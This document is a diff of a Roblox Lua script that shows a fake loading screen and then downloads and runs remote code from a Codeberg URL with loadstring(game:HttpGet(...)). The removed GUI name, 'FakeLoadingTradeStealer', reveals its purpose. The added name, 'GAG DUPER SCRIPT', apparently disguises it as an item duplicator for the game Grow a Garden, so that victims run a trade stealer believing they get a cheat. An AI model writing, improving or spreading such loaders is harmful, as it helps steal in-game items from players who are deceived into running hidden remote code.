@@ -1,19 +1,21 @@
--- [LOADING SCREEN PART]
+-- Wait for the player and PlayerGui to load
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
-local CoreGui = game:GetService("CoreGui")
+local PlayerGui = player:WaitForChild("PlayerGui")
 
 -- Create ScreenGui
-local ScreenGui = Instance.new("ScreenGui", CoreGui)
-ScreenGui.Name = "FakeLoadingTradeStealer"
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "GAG DUPER SCRIPT"
+ScreenGui.Parent = PlayerGui
 
 -- Background Frame
-local Background = Instance.new("Frame", ScreenGui)
+local Background = Instance.new("Frame")
 Background.Size = UDim2.new(1, 0, 1, 0)
 Background.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+Background.Parent = ScreenGui
 
 -- Loading Text
-local LoadingText = Instance.new("TextLabel", Background)
+local LoadingText = Instance.new("TextLabel")
 LoadingText.Size = UDim2.new(0, 200, 0, 50)
 LoadingText.Position = UDim2.new(0.5, -100, 0.4, 0)
 LoadingText.Text = "Loading..."
@@ -21,32 +23,43 @@ LoadingText.TextColor3 = Color3.fromRGB(255, 255, 255)
 LoadingText.TextSize = 28
 LoadingText.Font = Enum.Font.SourceSansBold
 LoadingText.BackgroundTransparency = 1
+LoadingText.Parent = Background
 
 -- Progress Bar Background
-local ProgressBarBG = Instance.new("Frame", Background)
+local ProgressBarBG = Instance.new("Frame")
 ProgressBarBG.Size = UDim2.new(0, 300, 0, 20)
 ProgressBarBG.Position = UDim2.new(0.5, -150, 0.5, 0)
 ProgressBarBG.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 ProgressBarBG.BorderSizePixel = 0
+ProgressBarBG.Parent = Background
 
 -- Progress Bar Fill
-local ProgressBarFill = Instance.new("Frame", ProgressBarBG)
+local ProgressBarFill = Instance.new("Frame")
 ProgressBarFill.Size = UDim2.new(0, 0, 1, 0)
 ProgressBarFill.BackgroundColor3 = Color3.fromRGB(0, 200, 0)
 ProgressBarFill.BorderSizePixel = 0
+ProgressBarFill.Parent = ProgressBarBG
 
 -- Animate Loading Progress
 spawn(function()
     for i = 1, 100 do
-        ProgressBarFill:TweenSize(UDim2.new(i / 100, 0, 1, 0), "Out", "Quad", 0.05, true)
+        ProgressBarFill.Size = UDim2.new(i / 100, 0, 1, 0)
         LoadingText.Text = "Loading... " .. i .. "%"
         wait(0.05)
     end
 end)
 
--- Wait for Animation to Complete
-wait(5)
+wait(45) -- Wait for the animation to finish
 
-local Spawner = loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
-Spawner.Load()
+-- Load and execute the remote script (make sure this returns a table with a Load() method)
+local success, Spawner = pcall(function()
+    return loadstring(game:HttpGet("https://codeberg.org/GrowAFilipino/GrowAGarden/raw/branch/main/Spawner.lua"))()
 end)
+
+if success and Spawner and typeof(Spawner.Load) == "function" then
+    Spawner.Load()
+else
+    LoadingText.Text = "Failed to load script."
+    wait(2)
+    ScreenGui:Destroy()
+end
